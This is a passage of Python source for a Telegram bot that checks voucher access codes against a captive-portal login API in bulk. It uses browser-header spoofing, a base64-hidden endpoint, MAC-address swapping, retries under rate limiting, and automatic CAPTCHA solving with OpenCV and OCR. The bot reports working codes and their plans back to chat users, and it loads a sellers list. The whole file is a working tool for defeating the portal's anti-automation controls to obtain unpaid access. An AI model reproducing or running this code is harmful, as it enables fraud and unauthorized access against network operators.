        'accept-language': 'en-US,en;q=0.9',
        'priority': 'u=0, i',
        'referer': session_url,
        'sec-ch-ua': '"Chromium";v="148", "Microsoft Edge";v="148", "Not/A)Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0',
        'cookie': 'sensorsdata2015jssdkcross=%7B%22distinct_id%22%3A%22xyz123%22%7D'
    }
    try:
        async with session.get(session_url, headers=headers, allow_redirects=True) as req:
            response = str(req.url)
            session_id = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", response)
            if session_id:
                return session_id.group(1)
            else:
                return previous_session_id
    except:
        return previous_session_id

def replace_mac(url, new_mac):
    return re.sub(r'(?<=mac=)[^&]+', new_mac, url)

async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False, message=None):
    global _connector
    if not recheck:
        current_task = scan_tasks.get(chat_id)
        if not current_task or current_task.get("scan_id") != scan_id:
            return

    post_url = base64.b64decode(
        b'aHR0cHM6Ly9leGFtcGxlLmNvbS9hcGkvYXV0aC92b3VjaGVyLz9sYW5nPWVuX1VT'
    ).decode()

    response = None
    resp_json = None

    for attempt in range(2):
        timeout = aiohttp.ClientTimeout(total=25)
        async with aiohttp.ClientSession(
            connector=_connector,
            connector_owner=False,
            cookie_jar=aiohttp.CookieJar(),
            timeout=timeout
        ) as task_session:
            session_id = await get_session_id(task_session, session_url, None)
            if not session_id:
                retry_count[chat_id] = retry_count.get(chat_id, 0) + 1
                return

            auth_code = None
            for _ in range(8):
                try:
                    image = await Captcha_Image(task_session, session_id)
                    text = await Captcha_Text(image)
                    if not text:
                        continue
                    verified = await Varify_Captcha(task_session, session_id, text)
                    if verified:
                        auth_code = text
                        break
                except Exception as e:
                    print(f"[perform_check] captcha error: {e}")
            if not auth_code:
                retry_count[chat_id] = retry_count.get(chat_id, 0) + 1
                return

            if not recheck:
                current_task = scan_tasks.get(chat_id)
                if not current_task or current_task.get("scan_id") != scan_id or current_task.get("stop"):
                    return

            data = {
                "accessCode": code,
                "sessionId": session_id,
                "apiVersion": 1,
                "authCode": auth_code,
            }
            headers = {
                "authority": "example.com",
                "accept": "*/*",
                "accept-language": "en-US,en;q=0.9",
                "content-type": "application/json",
                "origin": "https://example.com",
                "referer": f"https://example.com/src/index.html?sessionId={session_id}",
                "sec-ch-ua": '"Chromium";v="139", "Not;A=Brand";v="99"',
                "sec-ch-ua-mobile": "?1",
                "sec-ch-ua-platform": '"Android"',
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "user-agent": "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
            }
            try:
                async with task_session.post(post_url, json=data, headers=headers) as req:
                    response = await req.text()
                    resp_json = json.loads(response)
                    print(f"[voucher] code={code} attempt={attempt+1} status={req.status} resp={resp_json}")
            except Exception as e:
                print(f"[perform_check] error: {e}")
                retry_count[chat_id] = retry_count.get(chat_id, 0) + 1
                return

        if response and 'request limited' in response:
            print(f"[perform_check] rate limited on code={code}, retrying (attempt {attempt+1}/2)")
            retry_count[chat_id] = retry_count.get(chat_id, 0) + 1
            continue
        break

    if not response:
        return

    if 'logonUrl' in response:
        if recheck:
            return code

        plan = "Unknown"
        if resp_json and isinstance(resp_json, dict):
            for key in ["plan", "time", "duration", "voucherPlan", "planName"]:
                val = resp_json.get(key)
                if val and str(val) != "Unknown":
                    plan = val
                    break
            if plan == "Unknown":
                data = resp_json.get("data")
                if isinstance(data, dict):
                    for key in ["plan", "time", "duration", "voucherPlan"]:
                        val = data.get(key)
                        if val and str(val) != "Unknown":
                            plan = val
                            break

        if chat_id not in success_texts:
            success_texts[chat_id] = []
        success_texts[chat_id].append({"code": code, "plan": plan})
        found_count[chat_id] = found_count.get(chat_id, 0) + 1

        if message:
            code_list = success_texts[chat_id]
            formatted = ", ".join([f"{item['code']}({item['plan']})" for item in code_list])
            text = f"✅ Success Codes: {formatted}"
            try:
                if chat_id not in success_messages:
                    sent = await bot.send_message(chat_id=message.chat.id, text=text)
                    success_messages[chat_id] = sent.message_id
                else:
                    try:
                        await bot.edit_message_text(chat_id=message.chat.id, message_id=success_messages[chat_id], text=text)
                    except Exception:
                        sent = await bot.send_message(chat_id=message.chat.id, text=text)
                        success_messages[chat_id] = sent.message_id
            except Exception as e:
                print(f"Success Message Error: {e}")

        await SUCCESS_CODE.put({"chat_id": chat_id, "code": code})

    elif 'STA' in response:
        if chat_id not in limited_texts:
            limited_texts[chat_id] = []
        limited_texts[chat_id].append(code)
        limited_line = "\n".join(limited_texts[chat_id])
        if message:
            try:
                if chat_id not in limited_messages:
                    sent = await bot.send_message(chat_id=message.chat.id, text=f"⚠️ Limited Codes:\n\n{limited_line}")
                    limited_messages[chat_id] = sent.message_id
                else:
                    try:
                        await bot.edit_message_text(chat_id=message.chat.id, message_id=limited_messages[chat_id], text=f"⚠️ Limited Codes:\n\n{limited_line}")
                    except Exception:
                        sent = await bot.send_message(chat_id=message.chat.id, text=f"⚠️ Limited Codes:\n\n{limited_line}")
                        limited_messages[chat_id] = sent.message_id
            except Exception as e:
                print(f"Limited Message Error: {e}")

_ocr = ddddocr.DdddOcr(show_ad=False)

def _ocr_sync(image_bytes):
    nparr = np.frombuffer(image_bytes, np.uint8)
    img = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
    if img is None:
        return None
    gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
    blur = cv2.GaussianBlur(gray, (3, 3), 0)
    _, thresh = cv2.threshold(blur, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)
    _, buffer = cv2.imencode('.png', thresh)
    result = _ocr.classification(buffer.tobytes())
    return result.upper()

async def Captcha_Text(image_bytes):
    return await asyncio.to_thread(_ocr_sync, image_bytes)

async def Captcha_Image(session, session_id):
    headers = {
        'authority': 'example.com',
        'accept': 'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.9,my;q=0.8',
        'referer': 'https://example.com/src/index.html',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Linux"',
        'sec-fetch-dest': 'image',
        'sec-fetch-mode': 'no-cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
    }
    params = {
        'sessionId': session_id,
        '_t': str(time.time()),
    }
    async with session.get('https://example.com/api/auth/captcha/image', params=params, headers=headers) as req:
        return await req.read()

async def Varify_Captcha(session, session_id, text):
    headers = {
        'authority': 'example.com',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9,my;q=0.8',
        'content-type': 'application/json',
        'origin': 'https://example.com',
        'referer': 'https://example.com/src/index.html',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Linux"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
    }
    json_data = {
        'sessionId': session_id,
        'authCode': text,
    }
    async with session.post('https://example.com/api/auth/captcha/verify', headers=headers, json=json_data) as req:
        data = await req.json()
        print(f"[Varify_Captcha] status={req.status} authCode={text} response={data}")
        if data.get("success") == True:
            return session_id
        else:
            return None

# ---------- POLLING & MAIN ----------
async def start_polling():
    backoff = 5
    while True:
        try:
            await bot.infinity_polling(timeout=20, request_timeout=20)
            return
        except (aiohttp.ClientError, asyncio.TimeoutError) as e:
            print(f"Polling connection error: {e}. Reconnecting in {backoff}s...")
            await asyncio.sleep(backoff)
            backoff = min(backoff * 2, 60)
        except Exception as e:
            print(f"Unexpected polling error: {e}. Reconnecting in {backoff}s...")
            await asyncio.sleep(backoff)
            backoff = min(backoff * 2, 60)

async def main():
    global session, _connector
    await load_auth_list()
    await load_result()
    await load_sellers()

    timeout = aiohttp.ClientTimeout(total=30)
    _connector = aiohttp.TCPConnector(limit=2000, ttl_dns_cache=300, ssl=False)
    session = aiohttp.ClientSession(timeout=timeout, connector=_connector, connector_owner=False)

    try:
        asyncio.create_task(web_server())
        asyncio.create_task(periodic_result_saver())
        await start_polling()
    finally:
        await session.close()
        await _connector.close()

if __name__ == '__main__':
    asyncio.run(main())
